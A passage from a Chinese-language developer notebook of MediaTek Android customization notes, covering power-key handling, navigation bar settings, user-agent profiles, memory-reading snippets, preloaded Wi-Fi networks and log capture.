        fw.append("\n" + System.currentTimeMillis() + "\t" + tag + ",\t" + str);
    } catch (IOException e) {
        e.printStackTrace();
    } finally {
        if (fw != null) {
            try {
                fw.flush();
                fw.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            fw = null;
        }
    }
}
```

## [selinux] L项目文件获取写入权限

```text
[FAQ13635] Android L APP 如何获取sys file system 中节点的写权限+SELinux_Policy_Editing_Guideline这个文档
device/mediatek/common/sepolicy/system_app.te
```

## 手机安装apk的代码：packages/apps/PackageInstaller/src/com/android/packageinstaller/

```text
在PackageInstallerActivity.java这个Activity中：
1.首先检查所要安装的程序是否是正确的安装文件
2.判断安装应用是否设置未知来源应用的安装判断：isInstallingUnknownAppsAllowed()
3.当前系统中是否已安装了此应用程序，提示用户是否重复安装
4.还获取所欲安装的程序所将要用到的权限，然后将这些信息通过一个对话框提示给用户，startInstallConfirm()
然后当用户确定安装时，启动packages/apps/PackageInstaller/src/com/android/packageinstaller/InstallAppProgress.java，在这个Activity中，系统调用
pm.installPackageWithVerificationAndEncryption(mPackageUri,observer,installFlags,installerPackageName);-->该方法实现在packageManagerService.java中，即进行安装
```

## [Snippet] 结束当前程序的进程

```text Java
android.os.Process.killProcess(android.os.Process.myPid());
```

## 如何让 app 自行处理 power key

```text
Power key 通常都是由 framework 自行的
app 无法拿到这个 key 值
如果想让某个 app 自行处理 power key
应该要怎么做呢?

L、M
修改PhoneWindowManager的interceptKeyBeforeQueueing方法：
....
case KeyEvent.KEYCODE_POWER: {
    result &= ~ACTION_PASS_TO_USER;
    isWakeKey = false; // wake-up will be handled separately
    //com.example.adc 为要处理power key的包名
    if (win != null && win.getAttrs() != null && win.getOwningPackage().equals("com.example.adc")) {
        return 1;// return 1事件就传给app处理
    }
    if (down) {
        interceptPowerKeyDown(event, interactive);
    } else {
        interceptPowerKeyUp(event, interactive, canceled);
    }
    break;
}
 
如果只想让power键让某个Activity处理，将以上的if条件改为：
if (win != null && win.getAttrs() != null && win.getAttrs().getTitle().equals("xxx.xxx.xxx.xxxActivity")) {
    return 1;// return 1 就会传给 xxx.xxx.xxx.xxxActivity处理
}
 
KK、JB
1: 修改 phoneWindowManager.java 的 interceptKeyBeforeQueueing 方法,在 reference line 后加入下面这段代码
case KeyEvent.KEYCODE_POWER: { //reference line
    result &= ~ACTION_PASS_TO_USER; //reference line
    // add begin
    ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
    try {
        if (activityManager.getRunningTasks(1).get(0).topActivity.getPackageName().equals("your_special_package_name")) { 
            //Please reset the special package name.
            result |= ACTION_PASS_TO_USER;
            Xlog.d(TAG,"detect power key in special package, pass to user!")
        }
    }catch(NullPointerException e){
        Xlog.d(TAG,"ingore a NullPointerException ..");
    }
    //add end
 
2: 同样在此分支内, 找到 else 语句段, 并找到如下位置加入
if (interceptPowerKeyUp(canceled || mPendingPowerKeyUpCanceled)) { //参考行
    if(!((result & ACTION_PASS_TO_USER) == ACTION_PASS_TO_USER)){ //加入行
        result = (result & ~ACTION_WAKE_UP) | ACTION_GO_TO_SLEEP; //原有代码
    } //加入行
}
```

## [默认值] ro值修改位置（KK）

```text
ro.build.display.id -->相当于版本号，可直接修改ProjectConfig.mk文件中的CUSTOM_BUILD_VERNO，CUSTOM_BUILD_VERNO1，CUSTOM_BUILD_VERNO2
ro.product.model -->/build/target/product/up29_h403_ddm.mk中
ro.product.name -->ProjectConfig.mk文件中SAGEREAL_PRODUCT_NAME
ro.product.device -->ProjectConfig.mk文件中SAGEREAL_TARGET_DEVICE
ro.product.board -->ProjectConfig.mk文件中SAGEREAL_TARGET_DEVICE
ro.product.locale.language -->/build/core/Makefile中可搜索define default-locale-language，其中后面的$是指取出的值赋值给default-locale-language
ro.product.locale.region  -->/build/core/Makefile中可搜索define default-locale-region，其中后面的$是指取出的值赋值给default-locale-region
ro.build.product -->ProjectConfig.mk文件中SAGEREAL_TARGET_DEVICE
ro.build.fingerprint --> /build/core/Makefile中可搜索BUILD_FINGERPRINT
```

## [Snippet] 如何获取可用内存

```text Java
private long getAvailMemory(Context context) {
    String path = "/proc/meminfo";
    String[]  arrayOfString = null;
    File file = new File(path);
    BufferedReader bufferedReader = null;
    InputStreamReader inputStreamReader = null;
    long avail_memory = 0;
    try {
        inputStreamReader = new InputStreamReader(new FileInputStream(file));
    } catch (FileNotFoundException e2) {
        android.util.Log.d("jcb", "e2 =", e2);
        e2.printStackTrace();
    }
    if (file.exists()) {
        bufferedReader = new BufferedReader(inputStreamReader);
        String readLine = null;
        try {
            for(int i = 0 ; i<2 ; i++){
                readLine = bufferedReader.readLine();
            }
            android.util.Log.d("jcb", "readLine = "+readLine);
            arrayOfString = readLine.split("\\s+");
            avail_memory = Integer.valueOf(arrayOfString[1] ).intValue() * 1024;
        } catch (IOException e1) {
            e1.printStackTrace();
            android.util.Log.d("jcb", "e1 =", e1);
        }
        android.util.Log.d("jcb", "getAvailMemory readLine = " + arrayOfString[1] );
        android.util.Log.d("jcb","getAvailMemory = "+ Formatter.formatFileSize(context,avail_memory));
    }
    return avail_memory;
}
```

## [Snippet] 如何获取总内存

```text Java
private long getTotalMemory(Context context) {
    // 获取android当前可用内存大小
    String path = "/proc/meminfo";
    String[]  arrayOfString = null;
    File file = new File(path);
    BufferedReader bufferedReader = null;
    InputStreamReader inputStreamReader = null;
    long initial_memory = 0;
    try {
        inputStreamReader = new InputStreamReader(new FileInputStream(file));
    } catch (FileNotFoundException e2) {
        // TODO Auto-generated catch block
        android.util.Log.d("jcb", "e2 =", e2);
        e2.printStackTrace();
    }
    if (file.exists()) {
        bufferedReader = new BufferedReader(inputStreamReader);
        String readLine = null;
        try {
            readLine = bufferedReader.readLine();
            android.util.Log.d("jcb", "readLine = "+readLine);
            arrayOfString = readLine.split("\\s+");
            initial_memory = Integer.valueOf(arrayOfString[1] ).intValue() * 1024;
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
            android.util.Log.d("jcb", "e1 =", e1);
        }
        android.util.Log.d("jcb", "readLine = " + arrayOfString[1] );
        android.util.Log.d("jcb","getTotalMemory = "+ Formatter.formatFileSize(context,initial_memory));
    }
    return initial_memory;
}
```

## [FAQ03065]  [默认值] 如何开启或隐藏 Navigation Bar

```text
第一步：修改系统变量。
打开目录下文件：alps/device/mediatek/工程名字/system.prop
修改变量值：qemu.hw.mainkeys=0
qemu.hw.mainkeys=1   表示隐藏Navigationbar
qemu.hw.mainkeys= 0   表示显示Navigationbar
注意： 如果工程没有定义该变量，再进行第二步。否则修改结束。因系统变量优先级比配置文件高。

第二步：修改配置文件。
frameworks/base/core/res/res/values/config.xml
device/mediatek/common/overlay/navbar/frameworks/base/core/res/res/values/config.xml
修改 config 文件中的 config_showNavigationBar 的值。

隐藏Navigationbar：

<bool name="config_showNavigationBar">false</bool>
将这个配置信息修改为false即可。

显示Navigationbar：
<bool name="config_showNavigationBar">true</bool>

将这个配置信息修改为true即可。

特别的，对于O版本还要修改如下：
O版本主要是google 设计默认有navigationbar，所以没有判断mNavigationBar 这个window 为null，还请修改如下，
如果还有其他异常报错请贵司按照这个mWindowManagerService.hasNavigationBar()办法来规避即可。
frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBar.java
frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBar.java
public NavigationBarView getNavigationBarView() {
    // return (NavigationBarView) mNavigationBar.getView(); 修改为下面：
    boolean showNav = mWindowManagerService.hasNavigationBar();
    if(showNav) {
        mNavigationBar.onKeyguardOccludedChanged(keyguardOccluded);
    } else {
        return null; 
    }
}

public void onKeyguardOccludedChanged(boolean keyguardOccluded) {
    //mNavigationBar.onKeyguardOccludedChanged(keyguardOccluded);修改如下：
    boolean showNav = mWindowManagerService.hasNavigationBar();
    if(showNav) {
        mNavigationBar.onKeyguardOccludedChanged(keyguardOccluded);
    }
}
```

## [make] 如何在L上预置图片且恢复出厂设置不会消失

```text
先在data/media中预置图片，然后在system/vendor下面预置图片，然后在恢复出厂设置的时候去调用recovery.cpp文件，在该文件中自己写方法把system/vendor下面的图片还原到data/media下面
ps:刷机进去后到开机不会进入recovery模式，也就是说不会调用recovery.cpp文件，但是在恢复出厂设置的时候是会进入recovery模式的，会调用recovery.cpp文件
提交记录：http://192.168.3.76:8007/gitweb/?p=ALPS-MP-N0.MP2-V1_SR6580_WE_N.git;a=commit;h=bb723f9be5edf6c5ccaaf04e5240d11fa6060691
```

## L项目上如何让手机能充电

```text
把 alps/kernel-3.10/drivers/misc/mediatek/mach/mt6735/include/mach/upmu_sw.h 文件中关闭宏 BATTERY_CDP_WORKAROUND  就可以充电了
```

## [FAQ12075] 如何让 keyguard run 在 com.android.keyguard 进程

```text
如何让 keguard run 在 com.android.keyguard 进程
KK 上, keyguard 默认会 run 在 com.android.systemui 进程中如果需要将 keyguard run 在 com.android.keyguard 进程中，请修改

alps/frameworks/base/packages/Keyguard/res/values/mtk_config.xml
-<string name="keyguard_process_name">com.android.systemui</string>
+<string name="keyguard_process_name">com.android.keyguard</string>

PS:L上keyguard作为SystemUI的一个lib,不再是一个独立的apk,不能运行在单独的进程。
```

## 开机进入桌面，会先出现壁纸，而后状态栏空白透明，屏幕其他地方为黑色，之后进入锁屏界面。这一概率比较大

```text
期望：希望不要出现状态栏透明空白，其他地方却是黑色
--- a/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarWindowView.java
public class StatusBarWindowView extends FrameLayout {
    onAttachedToWindow(){
    ...
    //WindowManagerGlobal.getInstance().changeCanvasOpacity(windowToken, true); 注释掉这句，设置不透明.
    setWillNotDraw(false);
} else {
    ...
}
```

## [RTL] 阿拉伯语下文字布局等相反，有些布局显示不正常，可采用如下方式优化

```text
1.Androidmanifest中设置android:supportsRtl="true"， 找到显示异常的布局，将其中的left，right等标签修改为start， end标签
eg: android:layout_marginStart替换android:layout_marginLeft, android:layout_alignParentStart替换android:layout_alignParentLeft

2.图片若显示异常，可尝试将图片修改正常，放置res下带有ldrtl的文件夹中，具体根据手机分辨率放置
eg：res/drawable-ldrtl-hdpi

3.重写 public void onRtlPropertiesChanged(int layoutDirection)， 根据layoutDirection判断
layoutDirection = 1， 则为RTL
layoutDirection = 0， 则为LTR

4.可根据Configuration的getLayoutDirection()方法获取是否是View.LAYOUT_DIRECTION_RTL
RTL     right-> left
LTR     left-> right
```

## [默认值] 如何去看调用的是 drawable_hdpi 还是 drawable_xdpi 等?

```text
alps/device/mediatek/common/aapt/aapt_config.mk
根据屏幕宽度和高度匹配
```

## preference设置后如何保存到sharedPrefence的文件中

```text
在布局文件中加上 android:persistent="true"，如果为false就不会保存到sharedPrefence
```

## 系统数据库对多媒体文件已经进行了归类，我们使用它就可以了

```text
String volumeName = "external";
获取音频
Uri uri = Audio.Media.getContentUri(volumeName);
获取视频
uri = Video.Media.getContentUri(volumeName);
获取图片
uri = Images.Media.getContentUri(volumeName);
获取所有文件
uri = Files.getContentUri(volumeName);
可以看出音频，视频，图片已经完全被系统归类好了，对于apk, doc, zip等文件，我们可以根据它们的后缀在uri = Files.getContentUri(volumeName);里面进行筛选，获得我们想要的数据
```

## [知识点]  [UserAgent]  [UA] UA相关

```text
UserAgent：Http协议中的一部分，属于头域的组成部分，是一种向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。UA字符串在每次浏览器HTTP请求时发送到服务器。
ex:browser.UserAgent = Athens15_TD/V2 Linux/3.0.13 Android/4.0 Release/02.15.2012 Browser/AppleWebKit534.30 Mobile Safari/534.30 System/Android 4.0.1;
mms.UserAgent = Android-Mms/2.0
UAProfileURL是一个相当于放在某个服务器的UAProfile的网址，如http://218.249.47.94/Xianghe/MTK_Phone_KK_UAprofile.xml
UAProfile就是上面的MTK_Phone_KK_UAprofile.xml文件，该文件中有终端机的一下信息：
1、硬件信息：制造厂商、类型、屏幕大小（像素、文字等）
2、软件信息：应用软件管理版本、SK-VM版本、MIN
UAProfile文件描述了手机的功能，包括供应商、型号、分辨率、多媒体功能、支持字符集等

[FAQ13899]  [VS] RTSP流媒体UA/UAProfile修改方法
[FAQ04656] 如何修改Android自带浏览器的User Agent

可以查看 UA 的网址
186.148.57.28/browser/httpreq   //不可用了～
www.ua.yeswap.com
www.show-ip.net/browserinfo     //不可用了～
http://whatsmyuseragent.com/
http://whatsmyua.com/
http://www.useragentstring.com/

browser.UserAgent所在位置
alps/device/sagetel/sr6572_wet_l/custom.conf中的
#browser.UserAgent = Athens15_TD/V2 Linux/3.0.13 Android/4.0 Release/02.15.2012 Browser/AppleWebKit534.30 Mobile Safari/534.30 System/Android 4.0.1;
browser.UAProfileURL = http://218.249.47.94/Xianghe/MTK_Phone_KK_UAprofile.xml
mms.UserAgent = Android-Mms/0.1
mms.UAProfileURL = http://www.google.com/oha/rdf/ua-profile-kila.xml

//通过代码获取 UA
public String getUserAgent() {
    String user_agent = ProductProperties.get(ProductProperties.USER_AGENT_KEY, null);
    return user_agent;
}


Webview是用来浏览网页或浏览文件使用，使用google webview会有以下两问题：
1.打开中文电子书乱码
2.浏览器输入 186.148.57.28/browser/httpreq，查看UAPROFILE为Unknow
```

## [UA]  [Browser]  [FAQ13899]  [VS] RTSP流媒体UA/UAProfile修改方法

```text
方法一：直接修改配置脚本custom.conf
*.UAProfileURL = http://218.249.47.94/Xianghe/MTK_Phone_KK_UAprofile.xml
改为
*.UAProfileURL = http://218.249.47.94/Xianghe/MTK_Athens15_UAProfile.xml 
 
KK版本路径：alps/mediatek/config/&project_name/custom.conf里下面行
L版本路径在：alps/vendor/mediatek/proprietary/frameworks/base/custom/custom.conf
客户的也可以放在alps/device/mediatek/&project_name/custom.conf

方法二：修改代码
请修改frameworks/av/media/libstagefright/rtsp/ARTSPConnection.cpp
Void ARTSPConnection:: MakeUserAgent(AString *userAgent) 
里面有两处userAgent->append(“x-wap-profile: http://218.249.47.94/Xianghe/MTK_Athens15_UAProfile.xml”)让它always跑到.
```

## [UA] UAProf

```text
UA的全称是User Agent，即用户代理。UAProf 的全称是User Agent Profile,就是 用户代理描述，主要用于描述终端设备的性能和优先选择信息，主要是为了让其他设备（比如WAP网关）能够自动识别终端的能力，从而可以优化传递给终端的内容格式。UAProf通常描述了终端的硬件平台、软件平台、与此设备相连的网络环境特性等信息。
UAProf是一个xml的形式，描述了七个方面的特性。
HardwarePlatform: 硬件平台
SoftwarePlatform: 软件平台
BrowserUA: 终端浏览器
NetworkCharacteristics：网络特性
WAPCharacteristics：WAP特性
PUSHCharacteristics：PUSH特性
MmsCharacteristics：MMS特性（电信暂无）

UAProf常见于运行商定制终端。运营商对这些UAProf进行集中管理。运营商根据它对终端设备的软硬件特性进行判断，当向终端设备推送自己的增值业务时，会跟据这些特性来推送适合终端设备的内容。比如可以判断出终端设备是支持MP4还是RM格式视频。根据支持不同的视频格式，推送不同的视频内容。
非运营商定制设备也可以向运营商提供终端设备的UAProf，那么运营商是如何收集非运营商定制设备的UAProf的呢？
收集的方式是这样的，在手机的浏览器发送http信息是，手机的http Heaer的字段信息多了两个信息，分别是User-Agent（用户浏览器名称）和x-wap-profile(UAProf的网络路径)。运营商只要根据x-wap-profile制定的网络路径进行下载，就可以得到该终端的UAProf，从而达到收集的目的。

那么在Android中，如何写入UAProf的网络路径这个头信息呢。
我们可以在Framework下的webkit目录下的BrowserFramework文件中进行修改。我们可以在startLoadingResource函数中加入headers.put("x-wap-profile", "http://www-ccpp.tcl-ta.com/files/ALCATEL_one_touch_890D.xml");

然而并不是每个终端都会定制这个头信息，因此会有很多设备，运营商无法知道确切的信息。因此有替代的方案是使用简单的UA String。
那么Android中是怎么定义自己的UA String的呢？
主要改动有两个文件。packages\apps\Browser\src\com\android\browser\BrowserSettings.java和packages\apps\Browser\res\values\strings.xml。
首先看strings.xml文件，有两个数组。

<string-array name="pref_development_ua_choices" translatable="false">
    <item>Android</item>
    <item>Desktop</item>
    <item>iPhone</item>
</string-array>

<string-array name="pref_development_ua_values" translatable="false">
    <item>0</item>
    <item>1</item>
    <item>2</item>
</string-array>

这两个数组是什么含义呢？
原来，android所用的浏览器未Chrome lite，该浏览器在不同平台上是不一样的。它预先定义了android, Mac Os和iphone三个平台下的UA String。
我们来看下代码。

private static final String DESKTOP_USERAGENT = "Mozilla/5.0 (Macintosh; " + "U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, " + "like Gecko) Version/4.0 Safari/530.17";
private static final String IPHONE_USERAGENT = "Mozilla/5.0 (iPhone; U; " + "CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 " + "(KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
 
public void update(Observable o, Object arg) {
BrowserSettings b = (BrowserSettings)o;
WebSettings s = mSettings;
s.setLayoutAlgorithm(b.layoutAlgorithm);
if (b.userAgent == 0) {
    s.setUserAgentString(null);
} else if (b.userAgent == 1) {
    s.setUserAgentString(DESKTOP_USERAGENT);
} else if (b.userAgent == 2) {
    s.setUserAgentString(IPHONE_USERAGENT);
}

这样我们就一目了然了。如果想加入自己的UA String，那么在b.userAgent == 0时，加入自己的UAString。

注:该文为转载:现在4.2上在syncSetting()里面进行获取和设置的,x-wap-profile 全局搜索就知道在哪儿设置uaprofile 的url了
```

## [log] 以下是根据早前的mtk分析kazam网络问题导致modem重启得到的经验，我们也可以根据以下信息对后续的丢信号问题进行分析

```text
1.在radio log中查找关键字updateDataStallInfo
如果出现连续的一片只有out的情况updateDataStallInfo: OUT
则说明网络出了问题，只有发出去的数据，却没有收到回复；
正常的应该是updateDataStallInfo: IN/OUT

2.搜索关键字onDataStallAlarm
06-04 12:09:17.374: D/DCT(1189): [0] onDataStallAlarm: tag=28495 do recovery action=3
在KK中当这个recovery action为3时，会去reset radio
在L中当这个recovery action为4时，会去reset radio
当达到次数条件时，会出现如下log：
06-04 12:10:49.618: D/DCT(1189): [0] restarting radio with gsm.radioreset to true
06-04 12:10:50.621: D/DCT(1189): [0] restartRadio: ************TURN OFF RADIO**************

3.在mainlog中同步搜索socket：
06-04 12:10:20.674: I/System.out(1550): [socket]  [157]  connection www.google.com/216.58.221.132:443;LocalPort=36353(30000)
可以看到它都是在尝试与谷歌的地址链接，确定引起问题的原因
```

## [log] 如何在log中分析网络是否为3g

```text
打开radio_log，然后搜索“networktype =”即可
```

## 如何调整横竖屏

```text
1、android:screenOrientation="landscape"（"portrait"）
2、setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
3、横竖屏切换的时候先会去调用onSaveInstanceState(Bundle outState)方法，然后切换好了onRestoreInstanceState(Bundle savedInstanceState)
注意：可以通过outState的putInt，以及savedInstanceState的getint来传输数据
4、android:configChanges="orientation"，然后切换横竖屏的时候可以去重写onConfigurationChanged(Configuration newConfig)方法
```

## 发送开机广播的位置

```text
frameworks/base/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardViewMediator.java  -->  onBootCompleted() 方法里面进行开机广播的发送
```

## [默认值] USB连接方式，CD-ROM

```text
mediatek/config/mq16_h451_t3_p/system.prop 中搜索 ro.sys.usb.storage.type，然后在后面可以加上你想加的选择项 mtp,mass_storage
usb、mtp ：真正修改的地方：device/sagetel/$base_project/system.prop中的ro.sys.usb.storage.type值设为mtp,mass_storage，现在都用宏控，即config_usbtype=mtp,mass_storage
如何选择默认选择为usb：用宏控MTK_MASS_STORAGE = yes
cd rom：真正修改的地方：device/sagetel/$base_project/system.prop中的ro.sys.usb.bicr设为yes，现在都用宏控，即ro_sys_usb_bicr=yes
```

## [默认值] 如何使Settings --> Security --> Lock screen = None

```text
frameworks/base/packages/SettingsProvider/res/values/defaults.xml 中的 def_lockscreen_disabled 改为 true
```

## [默认值] L项目的falsh的配置怎么看

```text
ProjectConfig.mk文件--> sagereal_memory_flash = EMMC_64_8（8G+1G）、EMMC_32_4（4G+512M）、EMMC_16GB_2GB（16G+2G）
```

## [默认值]  [FAQ09022] 如何调整锁屏界面的背景亮度

```text
锁屏和launcher一样，都是透到wallpaper上的.但是同样一张wallpaper背景图片，在锁屏界面上看起来要比launcher暗一些。这是因为锁屏界面设置了一个半透明的灰色背景色0X70000000。
如果需要调整锁屏界面的背景色，可以通过调整KeyguardViewBase.java中BACKGROUND_COLOR的值。

L上的修改参考如下:
ScrimView.java()
private float mViewAlpha = 1.0f; // 将1.0f修改为0.0f
```

## 如何实现每台手机的序列号serial number唯一?

```text
KK：alps/mediatek/platform/mt65**/ kernel/core/mt_devs.c中定义CONFIG_MTK_USB_UNIQUE_SERIAL
L ：alps/bootable/bootloader/lk/app/mt_boot/mt_boot.c中定义CONFIG_MTK_USB_UNIQUE_SERIAL
M ：alps/vendor/mediatek/proprietary/bootable/bootloader/lk/app/mt_boot/mt_boot.c 中定义CONFIG_MTK_USB_UNIQUE_SERIAL

PS：在c文件中定义该CONFIG_MTK_USB_UNIQUE_SERIAL，即为#define CONFIG_MTK_USB_UNIQUE_SERIAL

FAQ10923[USB serial number客制化]  [系列2] ：如何实现每台手机的序列号唯一?10924[USB serial number客制化]  [系列3] ：如何修改手机序列号为Barcode ?
FAQ10925[USB serial number客制化]  [系列4] ：如何修改手机序列号为手机型号?
FAQ10926[USB serial number客制化]  [系列5] ：如何实现可以通过pc工具来修改serial number?
FAQ10927[USB serial number客制化]  [系列6] ：能否实现adb devices的序列号，usb serial number, cts device ID，SN一致?
```

## 文件监听

```text
当删除文件管理器上的音乐文件的时候，数据库会发生改变，可监听 Uri.parse("content://media/external/file") 这个uri的数据库
```

## [默认值] 如何预置wifi热点(redmine55627)

```text
kk：/mediatek/external/mtk_wifi/config/mtk-wpa_supplicant.conf
l：请在alps/hardware/mediatek/wlan/config/mtk-wpa_supplicant.conf
m:alps/vendor/mediatek/proprietary/hardware/connectivity/wlan/config/mtk-wpa_supplicant.conf
文件中增加network={} 即可。
network={
  ssid="aaaa"
  scan_ssid=1
  key_mgmt=NONE
}
ps：Wifi的预置说明也可以查看/alps/hardware/mediatek/wlan/wpa_suppli_8/wpa_supplicant/wpa_supplicant.conf

ps:ps:ps:在增加这个wifi热点的时候，一定要加上节省功耗的操作，文件路径：
kk：external/wpa_supplicant_8/wpa_supplicant/wpa_supplicant.c，在ssid_len == os_strlen("CMCC")判断之后，加上如下代码
if(ssid_len == os_strlen("MEO-WiFi.x")){
   if(os_strncasecmp(cmcc_conf->ssid,"MEO-WiFi.x",ssid_len) == 0){
       tmp = cmcc_conf->next;
       removed = 1;
       wpa_config_remove_network(wpa_s->conf, cmcc_conf->id);
       if(wpa_s->conf->update_config){
           if(wpa_config_write(wpa_s->confname, wpa_s->conf)){
               wpa_printf(MSG_DEBUG,"CTRL_IFACE:SAVE_CONFIG - Failed to update configuration");
           }else{
               wpa_printf(MSG_DEBUG,"CTRL_IFACE:SAVE_CONFIG -Configuration updated");
           }
       }
   }
}
[ALPS02441559]  预置WIFI热点造成功耗过大问题
[ALPS02399488]  预置WIFI热点造成功耗过大问题
M:external/wpa_supplicant_8/wpa_supplicant/wpa_supplicant.c,在wpa_supplicant_init_iface
Redmine 63933[bug] wifi有时不能自动连接上
```

## 识别SIM卡的位置

```text
SIM卡识别位置寻找与开机类似，我们知道SIM卡状态变化时会有 android.intent.action.SIM_STATE_CHANGED，这样我们就可以找发出此广播的地方：
alps/frameworks/opt/telephony/src/java/com/android/internal/telephony/uicc/IccCardProxy.java 其中有一个方法为 broadcastIccStateChangedIntent()
```

## 开机顺序

```text
开机顺序：
IccCardProxy（在亮屏之前会有消息，在手机运行过程中sim卡状态改变也会有消息）---主要用来读取数据，也需要启动动画
doKeyguardLocked（在亮屏之前）
finishBooting（在亮屏之后一小段时间）---启动动画
```

## 如何自定义google launcher的桌面

```text
自己写一个apk（比如说packages/apps/SageRealApp/GoogleHomeCustomization/），这个apk的里面是一个广播接收器，action为com.android.launcher3.action.PARTNER_CUSTOMIZATION
```

## Handler.post(runnable)和 new Thread(runnable)的区别

```text
mHandler.post(mMeoRunnable);这个是没有启动新的线程，还是在原来线程中，用这个的好处主要是可以在非ui线程中修改ui
new Thread(runnable)，这个是直接启动新的线程
```

## 防止用户在最近应用程序列表中看到

```text
在 activity 中请加入 android:excludeFromRecents="true" 属性
```

## M项目上关于settingsProvider是在哪里?

```text
adb shell --> data/system/user/0
android N后某些数据库位置：
Google Now Launcher数据库存放位置  ---->  /data/data/com.google.android.googlequicksearchbox/databases/launcher.db
ContactsProvider ----->  contacts.db和callog.db都位于data/user/0/com.android.providers.contacts/databases
TelephonyProvider -----> data/user_de/0/com.android.providers.telephony/databases
MediaProvider -----> data/user/userid/com.android.providers.media/databases
```

## [默认值]  [FM] 如何设置fm、music的耳机声音提示等级

```text
frameworks/base/core/res/res/values/config.xml 中的 config_safe_media_volume_index 值
```

## [默认值] 手机加密默认开关方法

```text
/device/sagetel/sr6735m_35gu_l/fstab.mt6735，encryptable=/dev/block/platform/mtk-msdc.0/by-name/metadata表示默认关闭，而替换成forceencrypt表示默认开启
该文件可能位于project、platform、common下，优先级从前到后，以优先级最高的属性为准
手动开启加密方法：
1.电量在80%以上
2.连接usb或者充电器
3.设置锁定屏幕 PIN 或密码
点击加密菜单进行加密，刚刚刷的软件一般加密需要几分钟时间，加密成功后会自动重启手机，再进入菜单会显示“已加密”，菜单点击无效

此功能可以用来加密手机上的所有数据，包括 Google 帐户、应用数据、音乐和其他媒体信息、已下载的信息等。如果执行了加密操作，您每次开机时都必须输入数字 PIN 或密码。
请注意，上述 PIN 或密码与您在未加密状态下解锁手机时所用的相同，无法单独设置。
警告：加密操作无法撤消。要将手机恢复为未加密状态，唯一的方法是恢复出厂设置，但这会清除您的所有数据

三百四十四、客户希望在通话过程中我方开始录音时，对方能够收到提示音；
我们发现在通话过程中点击拨号盘会有声音发出，且对方能够听到，于是我们在通话录音开启的时候使用拨号盘的发声方式去解决此问题；
方法很简单：
alps/packages/apps/InCallUI/src/com/android/incallui/CallButtonFragment.java
在onVoiceRecordClick方法中添加如下：

Call mRecordCall=CallList.getInstance().getActiveCall();
TelecomAdapter.getInstance().playDtmfTone(mRecordCall.getId(), '0');
TelecomAdapter.getInstance().stopDtmfTone(mRecordCall.getId());
TelecomAdapter.getInstance().playDtmfTone(mRecordCall.getId(), '9');
TelecomAdapter.getInstance().stopDtmfTone(mRecordCall.getId());
TelecomAdapter.getInstance().playDtmfTone(mRecordCall.getId(), '0');
TelecomAdapter.getInstance().stopDtmfTone(mRecordCall.getId());
代码连续播放了三个键的tone，用来区分录音和普通按键音
```

## Google app安全检查

```text
该项的修改在/alps/frameworks/base/packages/SettingsProvider/res/values/defaults.xml中的def_package_verifier_enable，该项需要设置为true；该项设置为true后会有一个问题，当在有数据连接或wifi的情况下安装app，大多数情况下会出现一个弹出框，详见redmine46265。而客户的sfr应用会在有网络的情况下自动下载app，因此会弹出这个框，客户要求将此框去掉，只要将该值设定为false即可，在KK上是这么做的；但是最新google认证中，需要有这个弹出框，因此将其设置为true，google认证软件以google认证优先
```

## 在 init.rc 文件里面添加回调

```text
//监听 sys.camera_standby 的值，如果设置为0则把 0100 00 写入到 /proc/driver/camsensor 文件中
on property:sys.camera_standby=0
    write /proc/driver/camsensor "0100 00"

on property:sys.camera_standby=1
    write /proc/driver/camsensor "0100 01"
```

## [Snippet] 如何隐藏settings-->apps里面的一些apk

```text Java
packages/apps/Settings/src/com/android/settings/applications/ApplicationsState.java，在该文件中的handleRebuildList()方法中的 filteredApps.add(entry);下面加上
for (int j=0;j<HIDE_APPS.length;j++) {
    if (HIDE_APPS[j] .equals(info.packageName)) {
        filteredApps.remove(entry);
    }
}

而
public final static String[]  HIDE_APPS = new String[]  {
 "com.mediatek.mtklogger",
 "com.example.factorydevelop",
 "com.example.factorydevelopx",
 "com.mediatek.ygps",
 "com.mediatek",
 "com.android.simmelock",
 "com.android.location.fused",
 "com.mediatek.engineermode",
 "com.mediatek.weather",
 "com.mediatek.appwidget.weather",
 "com.android.keyguard",
 "com.mediatek.thermalmanager",
 "com.android.printspooler",
 "com.mediatek.apst.target",
 "org.simalliance.openmobileapi.service",
};
```

## [FAQ12880] 锁屏界面如何延长亮屏到灭屏的等待时间

```text
默认锁屏界面无操作情况下到灭屏的等待时间是10S.如想延长锁屏界面到灭屏的等待时间, 可参考如下solution.
可以修改KeyguardViewMediator.java文件中常量AWAKE_INTERVAL_DEFAULT_MS的值:protected static final int AWAKE_INTERVAL_DEFAULT_MS = 10000;//>
可自行修改，但需注意:
(1)锁屏界面亮屏到灭屏的等待时间不会大于系统设置中休眠时间的值, 例如系统设置->显示->休眠中 设置为一分钟, 而AWAKE_INTERVAL_DEFAULT_MS的值为修改两分钟，则锁屏界面亮屏到灭屏的等待时间为一分钟。
(2)如果AWAKE_INTERVAL_DEFAULT_MS的值设置为小于10S, 则锁屏到灭屏的等待时间为10S.
```

## [log] 如何抓取操作数据库的log的方法（因为操作数据库的log较大且多，所以mtklogger一般不会把这块的代码放入到mobilelog里面，要进行以下操作）

```text
新建一个 local.prop 文件，里面填入
log.tag.SQLiteStatements=VERBOSE
log.tag.SQLiteTime=VERBOSE
log.tag.SQLiteLog=VERBOSE
log.tag.SQLiteQueryBuilder=VERBOSE
log.tag.SQLiteDatabase=VERBOSE
log.tag.SQLiteConnection=VERBOSE
log.tag.ContactsProvider=VERBOSE
log.tag.ContactAggregator=VERBOSE
log.tag.ContentService=VERBOSE
然后
adb remount
adb push ./local.prop ./data/
adb shell chmod 750 ./data/local.prop
adb reboot
添加以上log后，帮忙复现问题，抓取mobilelog来分析，并且给出复现问题时手机显示的时间。
复现后请不要再继续操作

[FAQ17460]  如何开启database的详细log
```

## [默认值] 如何看陀螺仪是否支持

```text
